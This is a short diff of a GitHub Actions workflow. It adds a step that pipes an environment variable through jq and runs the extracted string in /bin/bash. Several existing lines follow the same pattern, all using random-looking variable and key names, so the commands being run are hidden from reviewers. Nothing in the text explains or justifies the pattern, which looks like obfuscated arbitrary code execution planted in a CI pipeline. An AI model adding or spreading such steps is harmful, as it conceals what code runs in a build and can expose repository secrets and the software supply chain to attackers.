@@ -28,6 +28,7 @@ jobs:
           echo $zjhm885 | jq -r .rgr49877 | /bin/bash
           echo $bkgbj30459 | jq -r .x41 | /bin/bash
           printf '%s' "$ladu02" | jq -r .xkzjn1914 | /bin/bash
+          printf '%s' "$rhxlq341" | jq -r .wteg01640 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
